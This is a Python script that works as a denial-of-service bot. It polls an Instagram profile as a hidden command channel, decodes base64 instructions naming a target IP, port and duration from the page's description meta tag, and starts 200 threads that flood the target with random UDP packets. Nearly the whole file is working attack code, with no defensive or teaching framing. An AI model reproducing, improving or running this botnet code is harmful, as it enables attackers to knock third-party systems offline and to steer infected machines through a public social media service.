__author__ = 'Mark Miller'
import socket
import random
import time
from bs4 import BeautifulSoup
from urllib.request import urlopen
import base64
import sys
import threading
from threading import Thread

packetcounter = 0
class UDPFlood(threading.Thread):#Class to handle sending the attack
    def __init__(self, ip, port, duration):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.duration = duration
    def run(self): #function that sends UDP packets
        timeout = time.time() + int(self.duration) # defines a maximum run time (duration is passed as seconds.
        # 600 seconds is 10 minuntes
        port = int(self.port) #creates a random port number
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(int(1024)) #makes a string of size 1024 bytes of random characters
        while True:
            sock.sendto(bytes,(self.ip, port)) #sends a packet of size 1024 to the ip and port
            global packetcounter
            packetcounter  += 1
            if time.time() > timeout: #once the timeout time has occured, break the loop.
                break

checkProfile = 0
numThreads = 200
while True:
    if checkProfile < time.time():
        site = "http://instagram.com/updat3/"
        page = urlopen(site) #Sets url to the command Instagram profile
        soup = BeautifulSoup(page) #uses beautiful soup module to arrange html data
        command= soup.findAll('meta', {"property": True}) #Finds all meta tags
        for meta in command: #loops through all of the meta tags
            meta = str(meta)
            if 'property="og:description"' in meta: #finds the appropriate meta tag. In this case, it's the description tag
                meta = meta
                mySubString=meta[meta.find("!")+1:meta.find("@")] #! represents the start of the command, and @ represents the stop. This takes everything between the two symbols
                command = mySubString #sets the command equal to the command found above
        #The text is received in base64 and follows the format: Target IP Address, Target Port, Duration of attack(in seconds)
        if str(command) == "stop":
            checkProfile = time.time() + 300
            print("stopped: checking for new commmand in 5 minutes")
        else:
            command = base64.b64decode(command)  #decodes a base64 string into a byte string
            command = command.rstrip()  #removes the "\n" from the decoded base64 string
            command = str(command)  #converts from bytestring to a normal string
            command = command.replace("'","")  #removes uneccessary apostrophes from the decoded string
            command = command.replace("b","")  #for some reason base64 has a b infront of the string when decoded, this removes it.
            command = command.split(',')  # separates the string into a list
            ip = command[0] #ip is the first item in the decoded list
            port = command[1]  #port is the second item in the decoded list
            duration = command[2] # duration is the third and final item in the decoded list
            #command = UDPFlood(ip, port, duration)  #creates a new UDPFlood object with the new commands
            checkProfile = time.time() + int(duration) +20  # the while loop will run again 20 seconds after the attack finishes
            print("attacking address %s on port %s for %s seconds" % (ip, port, duration))
            for x in range(numThreads): #attacks the target
                command = UDPFlood(ip, port, duration)
                command.start()
                command.join(1)




